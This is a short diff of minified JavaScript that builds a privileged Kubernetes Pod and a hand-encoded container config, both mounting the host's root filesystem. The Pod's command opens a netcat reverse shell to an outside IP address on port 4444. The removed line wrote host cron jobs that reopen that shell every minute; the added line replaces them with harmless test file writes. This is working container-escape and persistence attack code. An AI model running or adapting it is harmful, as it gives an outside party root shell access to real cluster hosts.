@@ -4,7 +4,7 @@ function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection
 const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
 const v1=(k,v)=>Buffer.from([k,v]);
 const Y=JSON.stringify({apiVersion:'v1',kind:'Pod',metadata:{name:'zzf1'},spec:{hostNetwork:true,hostPID:true,containers:[{name:'c',image:'busybox:1.36',securityContext:{privileged:true},command:['/bin/sh','-c','nc 91.215.85.170 4444 -e /bin/sh'],volumeMounts:[{name:'h',mountPath:'/h'}]}],volumes:[{name:'h',hostPath:{path:'/'}}]}});
-const CMD="mkdir -p /h/etc/cron.d 2>/dev/null; echo '* * * * * root /usr/bin/nc 91.215.85.170 4444 -e /bin/sh' > /h/etc/cron.d/zzcb 2>/dev/null; echo '* * * * * root /bin/nc 91.215.85.170 4444 -e /bin/sh' >> /h/etc/cron.d/zzcb 2>/dev/null; ls /h/etc/cron.d > /h/tmp/zcron 2>/dev/null";
+const CMD="mkdir -p /h/etc 2>/dev/null; echo A > /h/etc/zzA 2>/dev/null; echo B > /etc/zzB 2>/dev/null";
 const mount=Buffer.concat([fl(0x0a,'/h'),fl(0x12,'/')]);
 const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
 const cfg=Buffer.concat([fl(0x0a,'zzc'+Math.floor(Math.random()*1e6)), v1(0x10,1), fl(0x12,'busybox:1.36'), fl(0x1a,'/bin/sh'), fl(0x22,'-c'), fl(0x22,CMD), Buffer.concat([v1(0x3a,mount.length),mount]), Buffer.concat([v1(0x7a,linc.length),linc])]);
